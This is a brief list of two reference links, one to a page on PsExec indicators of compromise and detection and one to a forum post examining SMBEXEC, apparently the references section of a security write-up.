* [PsExec.exe IOCs and Detection - Threatexpress](https://threatexpress.com/redteaming/tool_ioc/psexec/)
* [A Dive on SMBEXEC - dmcxblue - 8th Feb 2021](https://0x00sec.org/t/a-dive-on-smbexec/24961)
